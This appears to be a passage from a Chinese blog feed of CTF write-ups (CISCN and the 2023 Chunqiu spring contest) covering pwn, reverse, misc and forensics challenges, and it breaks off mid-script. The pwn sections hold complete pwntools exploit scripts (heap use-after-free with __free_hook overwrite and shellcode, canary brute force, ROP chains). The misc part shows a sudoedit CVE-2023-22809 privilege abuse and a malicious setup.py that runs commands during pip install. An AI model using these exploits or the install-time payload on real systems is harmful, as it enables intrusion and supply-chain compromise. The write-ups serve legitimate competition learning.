id="StrangeTalkBot">StrangeTalkBot</h2><p>程序使用了<code>protobuf</code>协议解析输入数据，构造<code>protobuf</code>数据，传入即可<br>程序中存在<code>uaf</code>漏洞与数组越界漏洞，利用<code>gadget</code>构造栈迁移，实现<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="funcanary">funcanary</h2><p>程序使用了<code>fork</code>，所以在子进程中报错，不会使程序中断，所以爆破<code>canary</code>，然后跳转到后门位置就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Shell-We-Go">Shell We Go</h2><p>当认证结束之后，执行<code>echo</code>指令，存在栈溢出，使用<code>+</code>可以跳过栈空间，直接覆盖返回值<br>构造<code>rop</code>，执行<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1>reverse</h1><h2 id="babyRE">babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> 导入xml</p><p>导出密文后异或得到flag</p><p><img src="/img/blog_img/CISCN/page_Image/85d183a7af058ab01508f6d4778e0578829cff0fbe8d5bd70a375b91d73ecccc.png" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023春秋杯春季赛</title>
    <link href="/page/wp/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <url>/page/wp/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="MISC">MISC</h2><h3 id="sudo">sudo</h3><p><a href="https://blog.csdn.net/weixin_52763014/article/details/130027297">CVE-2023-22809</a><br>连接靶机执行<code>sudo -V</code>,发现版本为<code>1.8.21p2</code>符合文章中说的版本<br>查看<code>/etc/sudoers</code>发现当前文件可以无密码执行<code>sudoedit /etc/GAMELAB</code>,这也符合文章中的条件<br>文章中执行了一条<code>EDITOR=&quot;vim -- /path/to/extra/file&quot; sudoedit /etc/GAMELAB</code>，用来编辑文件<br>那么我们改一下<code>EDITOR=&quot;cat -- /flag&quot; sudoedit /etc/GAMELAB</code>就可以读取<code>/flag</code>文件获得<code>flag</code></p><h3 id="piphack">piphack</h3><p>编写<code>setup.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>a=os.popen(<span class="hljs-string">&quot;cat /flag&quot;</span>).read()<br><span class="hljs-keyword">raise</span> Exception(a)<br><br><span class="hljs-comment"># git+https://github.com/xxx/xx.git</span><br></code></pre></td></tr></table></figure><p>在<code>github</code>中创建仓库，上传<code>setup.py</code>，然后连接靶机输入<code>git+https://github.com/xxx/xx.git</code>，靶机就会自动下载仓库中的文件，并执行<code>setup.py</code>,只要靶机将仓库下载下来，<code>flag</code>就会在出现报错信息中</p><h3 id="wordle">wordle</h3><p>连接靶机之后先随便输入几个五个字母的单词，然后将存在错误的字母的单词排除，将正确的字母在正确的位置的单词保留，之后就可以得到正确的单词</p><h3 id="58与64">58与64</h3><p>下载附件解压之后，得到很多<code>txt</code>文件，而<code>txt</code>文件中基本上只有一两个字母，根据题目中的<code>58</code>，猜测文件内容为<code>base58</code><br>将文件内容进行<code>base58</code>解密之后连接起来得到<code>base64</code>字符串，进行多次<code>base64</code>解密得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">text,mode=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> mode:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(text)==<span class="hljs-built_in">bytes</span>:<br>            text=text.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(text)==<span class="hljs-built_in">str</span>:<br>            text=text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> text<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b58</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.__base=<span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_str</span>(<span class="hljs-params">num</span>):<br>        cache=<span class="hljs-built_in">hex</span>(num)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)<br>        text=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(cache),<span class="hljs-number">2</span>):<br>            text.append(<span class="hljs-built_in">int</span>(cache[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>))<br>        <span class="hljs-keyword">return</span> text<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text</span>):<br>        text=convert(text,<span class="hljs-number">1</span>)<br>        err=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            n=<span class="hljs-number">0</span><br>            txt=[]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:<br>                err=i<br>                txt.append(self.__base.index(i))<br>            err=<span class="hljs-string">&#x27;&#x27;</span><br>            cache=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(txt)):<br>                cache=cache*<span class="hljs-number">58</span>+txt[i]<br>            detext=b58.int_to_str(cache)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(detext)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;%s is not found&#x27;</span>%err)<br><br>files=os.listdir(<span class="hljs-string">&#x27;tmp&#x27;</span>)<br>files.sort(key=<span class="hljs-keyword">lambda</span> d:<span class="hljs-built_in">int</span>(d[:-<span class="hljs-number">4</span>]))<br>outdata=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:<br>    f=<span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;tmp&#x27;</span>,i))<br>    outdata+=b58().decode(f.read())<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(outdata)<br>    outdata=base64.b64decode(outdata)<br></code></pre></td></tr></table></figure><h3 id="盲人隐藏了起来">盲人隐藏了起来</h3><p>解压附件得到三个文件<code>12</code>,<code>34.mp4</code>,<code>flag.zip</code>,使用<code>010</code>打开<code>12</code>,<code>34.mp4</code><br>发现<code>12</code>文件中的内容，与<code>34.mp4</code>中<code>mdat</code>段的内容结构类似，将<code>12</code>中的内容替换为<code>34.mp4</code>中的<code>mdat</code>段之后，打开视频得到压缩包密码<code>ChunJiSai7k7kbibi@!</code><br>解压得到了<code>flag.png</code>，在文件结尾存在字符串<code>keyischunqiu123</code>不过没有发现有什么用，执行<code>zsteg -a flag.png</code>，发现在<code>b1,bgr,lsb,xy</code>中存在<code>flag</code>信息,使用<code>zsteg flag.png -e b1,bgr,lsb,xy |strings | grep flag</code>得到flag</p><h3 id="happy2forensics">happy2forensics</h3><p>在<code>http</code>数据包中，发现有主机使用<code>POST</code>方法像服务器上传了一个<code>secret.rar</code>,导出之后解压得到<code>secret.vhdx</code>,装载之后发现是<code>bitlocker</code>加密的磁盘文件,在数据包中，存在一个主机使用<code>20</code>端口向<code>80</code>端口发送数据，因为<code>20</code>端口一半用于<code>FTP-DATA</code>协议,而且主机只发送<code>syn</code>数据包,不进行<code>tcp</code>连接,查看数据包之后发现<code>tcp.seq_raw</code>字段中可能存在数据<br>使用<code>tshark</code>导出数据<code>tshark -r happy2forensics.pcapng -Y &quot;tcp.srcport==20&quot; -T fields -e tcp.seq_raw</code>,将导出数据转换为字符串之后得到<code>bitlocker:120483-350966-299189-055297-225478-133463-431684-359403</code><br>装载磁盘文件,存在很多图片,同时还存在一个<code>210-1.png</code>无法直接打开,使用<code>010</code>查看之后发现存在多个文件,使用<code>foremost</code>分离文件,同时在磁盘文件中作为回收站的区域中存在一个压缩包,压缩包中存在<code>flag2.txt</code></p><p>下面是<code>jpg</code>文件内容<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics.jpg" srcset="/img/loading.gif" lazyload alt=""></p><p>根据提示合并磁盘文件中的<code>png</code>图片,与<code>210-1.png</code>分离之后得到的<code>png</code>图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">210-1.png</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> PIL<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">import</span> os<br>d=os.listdir(<span class="hljs-string">&#x27;png&#x27;</span>)<br>d.sort(key=<span class="hljs-keyword">lambda</span> n:<span class="hljs-built_in">int</span>(n[:-<span class="hljs-number">4</span>]))<br>i=Image.<span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,d[<span class="hljs-number">0</span>]))<br>w,h=i.size<br>im=Image.new(i.mode,(w*<span class="hljs-built_in">len</span>(d),h))<br>i.close()<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">try</span>:<br>        fp=os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,v)<br>        im1=Image.<span class="hljs-built_in">open</span>(fp)<br>        im.paste(im1,(i,<span class="hljs-number">0</span>))<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>im.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">磁盘文件</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> PIL<br>f=<span class="hljs-built_in">open</span>(<span 